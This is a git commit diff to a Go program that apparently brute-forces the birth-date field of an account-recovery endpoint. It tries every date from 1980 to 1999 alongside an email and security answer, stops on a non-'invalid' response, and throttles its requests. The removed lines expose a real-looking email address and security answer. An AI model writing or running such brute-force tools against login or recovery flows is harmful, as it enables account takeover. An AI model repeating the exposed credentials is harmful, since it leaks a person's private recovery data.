5e3dfaec3c76c8c1d914a782041648bc008cb6a2
Kodziak <kodziak1416@gmail.com>
2020-04-17 20:29:28 +0200

    Add function, implement proper creating date

--- main.go
+++ main.go
@@ -1,12 +1,14 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
 	"time"
 	"io/ioutil"
 	"net/http"
 	"strings"
+	"os"
 )
 
 func main() {
@@ -18,6 +20,9 @@ func main() {
 	maxMonth := 12;
 	maxYear := 1999;
 	minYear := 1980;
+	
+	email := getUserInput("Email?");
+	answer := getUserInput("Forgot answer?");
 
 	fmt.Println("URL:>", url)
 
@@ -25,14 +30,14 @@ func main() {
 	for year := minYear; year <= maxYear; year++ {
 		for month := minMonth; month <= maxMonth; month++ {
 			for day := minDay; day <= maxDay; day++ {
-				date := fmt.Sprintf("%d-%02d-%02d\n", year, month, day)
+				date := fmt.Sprintf("%d-%02d-%02d", year, month, day)
 				jsonWithDate := fmt.Sprintf(`
-						{
-								"email": "kasek1416@o2.pl",
-								"answers":["Puszek"],
-								"birthDate": "%v"
-						}
-					`, date);
+					{
+							"email": "%v",
+							"answers":["%v"],
+							"birthDate": "%v"
+					}
+				`, email, answer, date);
 
 				var jsonStr = []byte(jsonWithDate);
 
@@ -41,23 +46,35 @@ func main() {
 
 				client := &http.Client{}
 				resp, err := client.Do(req)
-					if err != nil {
-						panic(err)
-					}
-					defer resp.Body.Close()
+				if err != nil {
+					panic(err)
+				}
+				defer resp.Body.Close()
 
-					fmt.Println("Checking Date:", date);
-					fmt.Println("Response Status:", resp.Status)
-					body, _ := ioutil.ReadAll(resp.Body)
-					fmt.Println("Response Body:", string(body))
+				fmt.Println("Checking Email:", email)
+				fmt.Println("Checking Answer:", answer);					
+				fmt.Println("Checking Date:", date);
+				fmt.Println("Response Status:", resp.Status)
+				body, _ := ioutil.ReadAll(resp.Body)
+				fmt.Println("Response Body:", string(body))
 
-					if(!strings.Contains(string(body), "invalid")) {
-						fmt.Println("GOT YA!");
-						break getAccountBack
-					}
+				if(!strings.Contains(string(body), "invalid")) {
+					fmt.Println("GOT YA!");
+					break getAccountBack
+				}
 
-				time.Sleep(10 * time.Second);
+				time.Sleep(5 * time.Second);
 			}
 		}
 	}		
+}
+
+func getUserInput(askMessage string) string {
+	reader := bufio.NewReader(os.Stdin)
+
+	fmt.Println(askMessage);
+	fmt.Print("-> ");
+	text, _ := reader.ReadString('\n')
+
+  return strings.Replace(text, "\n", "", -1)
 }
